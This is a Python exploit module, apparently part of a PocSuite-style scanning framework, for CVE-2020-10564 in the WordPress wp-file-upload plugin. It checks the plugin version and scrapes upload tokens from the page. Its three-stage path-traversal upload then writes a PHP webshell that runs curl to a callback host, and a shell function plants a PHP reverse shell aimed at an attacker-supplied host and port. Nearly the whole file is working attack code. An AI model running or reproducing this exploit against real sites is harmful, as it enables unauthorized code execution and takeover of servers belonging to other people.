import json
import requests
import uuid
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str
import binascii
from Framework.Valueconfig import FORMATTIME, ValueStatus
from Framework.Library.Function.Function.PocSuite.api import paths

class file_upload: 
    def __init__(self, url): 
        self.url = url
    def check_version(self):
        url =self.url + "/wp-content/plugins/wp-file-upload/readme.txt"
        resp = requests.get(url, verify=False)
        if resp.status_code != 200 :
            return False
        fixed_version = 4.13 
        try: 
            current_version = resp.text.split("== Changelog ==")[1].split("= ")[1].split(" =")[0]
            if current_version < str(fixed_version): 
                return True
            else: 
                return False
        except: return False
    def exploit(self, php_shell):
        page = requests.get(self.url, timeout=5, verify=False)
        cookie = page.cookies
        print("[+] Plugin url: " + self.url)
        filename = random_str(6) + ".txt"
        payload = "../plugins/wp-file-upload/lib/" + filename 
        payload = binascii.hexlify(payload.encode())
        nonce = ''
        params_index = ''
        session_token = ''
        if 'wfu_uploader_nonce"' in page.text:
            idx = page.text.find('wfu_uploader_nonce" value="') + len('wfu_uploader_nonce" value="')
            nonce = page.text[idx:idx+20].split('"')[0]
            print("[+] Retrived nonce parameter: " + nonce)

        if 'params_index:"' in page.text:
            idx = page.text.find('params_index:"') + len('params_index:"')
            params_index = page.text[idx:idx+30].split('"')[0]
            print("[+] Retrived params_index parameter: " + params_index)

        if 'session:"' in  page.text:
            idx = page.text.find('session:"') + len('session:"')
            session_token = page.text[idx:idx+65].split('"')[0]
            print("[+] Retrived session_token parameter: " + session_token)

        fsize = str(len(php_shell))
        admin_ajax_url = self.url +  "/wp-admin/admin-ajax.php"
        d = {
            "action":"wfu_ajax_action_ask_server", "session_token":session_token,
            "sid":"1", "unique_id":"KpNKThIx0T", "wfu_uploader_nonce":nonce,
            "filenames":payload, "filesizes":fsize
        }

        resp = requests.post(admin_ajax_url, data=d, cookies=cookie, timeout=5)
        if "wfu_askserver_success" in resp.text:
            print("[+] Stage 1 success :)")
        else:
            print("[-] Something went wrong :/")

        ### stage 2 ###
        params = {
        "wfu_uploader_nonce":(None,nonce), "action":(None,"wfu_ajax_action"),
        "uploadedfile_1_index":(None,"0"), "uploadedfile_1_size":(None,fsize),
        "subdir_sel_index":(None,"-1"), "nofileupload_1":(None,"0"), "only_check":(None,"1"),
        "session_token":(None,session_token), "uploadedfile_1_name": (None,payload),
        "params_index":(None,params_index), "uniqueuploadid_1":(None,"KpNKThIx0T")
        }
        resp = requests.post(admin_ajax_url, files=params, cookies=cookie, timeout=5)

        if "wfu_fileupload_success" in resp.text:
            print("[+] Stage 2 work fine :)")
        else:
            print("[-] Something went wrong :/")

        ### stage 3 ###
        params = {
        "wfu_uploader_nonce":(None,nonce), "action":(None,"wfu_ajax_action"),
        "uploadedfile_1_index":(None,"0"), "uploadedfile_1_size":(None,fsize),
        "subdir_sel_index":(None,"-1"), "nofileupload_1":(None,"0"), "only_check":(None,"0"),
        "session_token":(None,session_token), "uploadedfile_1_name": (None,payload),
        "params_index":(None,params_index), "uniqueuploadid_1":(None,"KpNKThIx0T"),
        "uploadedfile_1":php_shell
        }

        resp = requests.post(admin_ajax_url, files=params, cookies=cookie, timeout=5)

        if "wfu_fileupload_success" in resp.text:
            page = requests.get(self.url, timeout=5)
            print("[+] Stage 3 work prefectly :)")
            print("[+] We should have our webshell, gonna check it!")
        else:
            print("[-] Something went wrong :/")





def verify(url): 
    result = file_upload(url)
    return result.check_version()

def attack(url, host_check_connect):
    result = file_upload(url)
    flag = str(uuid.uuid4().hex)
    php_code = '''<?php system("curl '''+ host_check_connect + '''/requestbin?data='''+ flag + '''"); ?>'''
    result.exploit(php_code)
    data_request_log = {
        "data": "{}".format(flag)
    }
    host_check = "{}/logrequestbin".format(host_check_connect)
    check = requests.get(host_check,params=data_request_log)
    if check.status_code == 200: 
        data = json.loads(check.text)
        if data['status'] == ValueStatus.Success: 
            return True, php_code
        else: 
            return False, php_code


def shell(vul_url, lhost, lport): 
    with open(paths.POCSUITE_ROOT_PATH+ "/init_pocs/cve_2020_10564/php-reverse-shell-source.php", "rb") as file: 
        shell = file.read().decode()
        file.close()
    php_shell = shell.replace('LHOST_cve_2020_10564', lhost)
    php_shell = php_shell.replace('LPORT_cve_2020_10564', lport)
    result = file_upload(vul_url)
    result.exploit(php_shell)
    return True
    

